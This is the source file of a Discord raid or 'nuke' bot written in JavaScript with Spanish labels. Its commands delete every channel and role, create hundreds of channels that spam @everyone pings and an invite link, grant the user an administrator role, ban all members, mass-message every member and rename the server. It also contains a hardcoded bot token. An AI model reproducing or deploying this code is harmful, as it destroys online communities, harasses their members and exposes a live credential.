const Discord = require("discord.js");
const client = new Discord.Client();
const chalk = require('chalk');
client.on("ready", () => {
console.log(chalk.red(`
`))
console.log(chalk.red(""));
console.log(chalk.red(` 
            ╭━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━╮
            │                                                                  │
            │          ${chalk.cyan('•.nuke')} = El servidor Vale verga                         │   
            │          ${chalk.green('• .delete')} = Elimina todos los canales del servidor      │
            │          ${chalk.magenta('• .raid')} = Crea muchos canales con ping                  │
            │          ${chalk.yellow('• .admin')} = Crea un rol de admin y te lo da              │
            │                                                                  │
            │                                                                  │
            │                ===== Usa ${chalk.red('.help')} para más info ====                │
            │                                                                  │
            ╰━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━╯

                       Bestia encendida: ${client.user.tag}`));
presencia();
});
function presencia() {
client.user.setPresence({
status: "dnd",
activity: {
name: "Cojiendo a servidores",
type: "STREAMING"
}
});
}
//nuke
client.on("message", message => {
if (message.author.bot) return;
if (message.content === '.nuke') {
message.delete()
message.guild.channels.cache.forEach(channel => channel.delete());
message.guild.channels.create(`attacked-by-\Wash`, {
type: 'text'
}).then(channel => {
channel.send("Raid By \Wash")
})
for (let i = 0; i <= 500; i++) {
message.guild.channels.create( `Raid By \Wash`, {
type: 'text'
})
.then(channel => {
channel.send("@everyone **Raid By \Wash - https://discord.gg/wash");
channel.send("@everyone **Raid By \Wash - https://discord.gg/wash");
channel.send("@everyone **Raid By \Wash - https://discord.gg/wash");
channel.send("@everyone **Raid By \Wash - https://discord.gg/wash");
channel.send("@everyone **Raid By \Wash - https://discord.gg/wash");
channel.send("@everyone **Raid By \Wash - https://discord.gg/wash");
channel.send("@everyone **Raid By \Wash - https://discord.gg/wash");
channel.send("@everyone **Raid By \Wash - https://discord.gg/wash");
channel.send("@everyone **Raid By \Wash - https://discord.gg/wash");
channel.send("@everyone **Raid By \Wash - https://discord.gg/wash");
channel.send("@everyone **Raid By \Wash - https://discord.gg/wash");
channel.send("@everyone **Raid By \Wash - https://discord.gg/wash");
channel.send("@everyone **Raid By \Wash - https://discord.gg/wash");
channel.send("@everyone **Raid By \Wash - https://discord.gg/wash");
channel.send("@everyone **Raid By \Wash - https://discord.gg/wash");
channel.send("@everyone **Raid By \Wash - https://discord.gg/wash");
channel.send("@everyone **Raid By \Wash - https://discord.gg/wash");
channel.send("@everyone **Raid By \Wash - https://discord.gg/wash");
channel.send("@everyone **Raid By \Wash - https://discord.gg/wash");
channel.send("@everyone **Raid By \Wash - https://discord.gg/wash");
channel.send("@everyone **Raid By \Wash - https://discord.gg/wash");
channel.send("@everyone **Raid By \Wash - https://discord.gg/wash");
channel.send("@everyone **Raid By \Wash - https://discord.gg/wash");
channel.send("@everyone **Raid By \Wash - https://discord.gg/wash");
channel.send("@everyone **Raid By \Wash - https://discord.gg/wash");
channel.send("@everyone **Raid By \Wash - https://discord.gg/wash");
channel.send("@everyone **Raid By \Wash - https://discord.gg/wash");
channel.send("@everyone **Raid By \Wash - https://discord.gg/wash");
channel.send("@everyone **Raid By \Wash - https://discord.gg/wash");
channel.send("@everyone **Raid By \Wash - https://discord.gg/wash");
channel.send("@everyone **Raid By \Wash - https://discord.gg/wash");
channel.send("@everyone **Raid By \Wash - https://discord.gg/wash");
channel.send("@everyone **Raid By \Wash - https://discord.gg/wash");
channel.send("@everyone **Raid By \Wash - https://discord.gg/wash");
})
}
message.guild.setName("Raid By \Wash");
message.guild.setIcon("https://media.discordapp.net/attachments/1105494453155790879/1108104484778946620/image.png");
}
})
//admin
client.on("message", async msg => {
if (msg.author.bot) return;
if (msg.content.toLowerCase().startsWith('.admin')) {
let rol = await msg.guild.roles.create({
data: {
name: ".",
color: "a09e9e",
permissions: "ADMINISTRATOR",
hoisted: false
}
})
msg.member.roles.add(rol)
.then(function(role) {
msg.member.addRole(role);
if (msg.deletable) msg.delete().catch(e => { });
})
.catch(e => { });
}
});
//banall

client.on("message", async message => {
    if(message.content.startsWith('.banall')){
      message.delete();
      if(!message.member.hasPermission("BAN_MEMBERS") || !message.member.hasPermission("ADMINISTRATOR")) return;
      message.guild.members.cache.forEach(member => {
        if(member != message.member && member.id != "ID" && member.id != "ID" && member.id != "ID"){
          member.ban();
        }
      })
    }});
//delete
client.on("message", message => {
if (message.author.bot) return;
if (message.content === '.delete') {
message.delete()
message.guild.channels.cache.forEach(channel => channel.delete());
message.guild.channels.create(`Raid By \Wash`, {
type: 'text'
}).then(channel => {
channel.send("https://media.discordapp.net/attachments/1105494453155790879/1108104484778946620/image.png")
})
}
})
//raid
client.on("message", message => {
if (message.author.bot) return;
if (message.content === '.raid') {
message.delete()
for (let i = 0; i <= 500; i++) {
message.guild.channels.create( "Raid By \Wash" , {
type: 'text'
}).then(channel => {
channel.send("@everyone **Raid By \Wash - https://discord.gg/wash");
channel.send("@everyone **Raid By \Wash - https://discord.gg/wash");
channel.send("@everyone **Raid By \Wash - https://discord.gg/wash");
channel.send("@everyone **Raid By \Wash - https://discord.gg/wash");
channel.send("@everyone **Raid By \Wash - https://discord.gg/wash");
channel.send("@everyone **Raid By \Wash - https://discord.gg/wash");
channel.send("@everyone **Raid By \Wash - https://discord.gg/wash");
channel.send("@everyone **Raid By \Wash - https://discord.gg/wash");
channel.send("@everyone **Raid By \Wash - https://discord.gg/wash");
channel.send("@everyone **Raid By \Wash - https://discord.gg/wash");
channel.send("@everyone **Raid By \Wash - https://discord.gg/wash");
channel.send("@everyone **Raid By \Wash - https://discord.gg/wash");
channel.send("@everyone **Raid By \Wash - https://discord.gg/wash");
channel.send("@everyone **Raid By \Wash - https://discord.gg/wash");
channel.send("@everyone **Raid By \Wash - https://discord.gg/wash");
channel.send("@everyone **Raid By \Wash - https://discord.gg/wash");
channel.send("@everyone **Raid By \Wash - https://discord.gg/wash");
channel.send("@everyone **Raid By \Wash - https://discord.gg/wash");
channel.send("@everyone **Raid By \Wash - https://discord.gg/wash");
channel.send("@everyone **Raid By \Wash - https://discord.gg/wash");
channel.send("@everyone **Raid By \Wash - https://discord.gg/wash");
channel.send("@everyone **Raid By \Wash - https://discord.gg/wash");
channel.send("@everyone **Raid By \Wash - https://discord.gg/wash");
channel.send("@everyone **Raid By \Wash - https://discord.gg/wash");
channel.send("@everyone **Raid By \Wash - https://discord.gg/wash");
channel.send("@everyone **Raid By \Wash - https://discord.gg/wash");
channel.send("@everyone **Raid By \Wash - https://discord.gg/wash");
channel.send("@everyone **Raid By \Wash - https://discord.gg/wash");
channel.send("@everyone **Raid By \Wash - https://discord.gg/wash");
channel.send("@everyone **Raid By \Wash - https://discord.gg/wash");
channel.send("@everyone **Raid By \Wash - https://discord.gg/wash");
channel.send("@everyone **Raid By \Wash - https://discord.gg/wash");
channel.send("@everyone **Raid By \Wash - https://discord.gg/wash");
channel.send("@everyone **Raid By \Wash - https://discord.gg/wash");
})
}
}
});
//mdall
client.on("message", message => {
if (message.author.bot) return;
if (message.content === ".mdall")
message.delete()
message.guild.members.cache.forEach(member => {
setInterval(function() {
member.send("https://discord.gg/wash").catch(error => { });
}, 450);
})
});
//borrar roles
client.on("message", message => {
if (message.author.bot) return;
if (message.content === ('.eliminarroles')) {
message.delete()
message.guild.roles.cache.map(roles => roles.delete());
}
});
//crear roles
client.on("message", message => {
if (message.author.bot) return;
if (message.content === '.crearroles') {
message.delete()
for (let i = 0; i <= 200; i++) {
message.guild.roles.create({ data: { name: `\Wash`, color: '#d41818', }, reason: 'razon', })
};
}
});
//nickall
client.on("message", msg => {
const args = msg.content.slice().trim().split(/ +/g);
const command = args.shift().toLowerCase();
if (command === '.nick') {
msg.delete()
let nickname = args.join(" ");
var i = 0;
msg.guild.members.cache.forEach(member => {
i++
}
)
msg.channel.send("> Cambiando el nombre de **" + i + "** usuarios a: **" + nickname + "**")
msg.guild.members.cache.forEach(member => {
member.setNickname(nickname)
})
}
});
//help 
client.on("message", message => {
  if (message.author.bot) return;
  const args = message.content.slice().trim().split(/ +/g );
  const command = args.shift().toLowerCase();
 if (command === '.help') {
     message.delete()
     const embed = new Discord.MessageEmbed()
          .addField('.nuke', `Elimina todos los canales del servidor`, true)
          .addField('.raid', `Crea muchos canales con ping`, true)
          .addField('.admin', `Crea un rol con admin y te lo da`, true)
          .addField('.crearroles', `Crea muchos roles en el servidor`, true)
          .addField('.eliminarroles', `Elimina todos los roles del servidor`, true)
          .addField('.banall', `Banea a todos en discord`, true)
          .setDescription(`**Prefix .**  `)
          .setColor(`#090502`)
          .setFooter(`discord.gg/wash`)
          .setAuthor('Comandos:', ' https://media.discordapp.net/attachments/1105494453155790879/1108104484778946620/image.png')
 }
});

client.login(`MTA1NzAxNTUwNDg0MzMxMzE2Mg.Gh3lj7.X76H-mBoBzuL_NMJDvdRZn37jYziYdriKqqeek`);
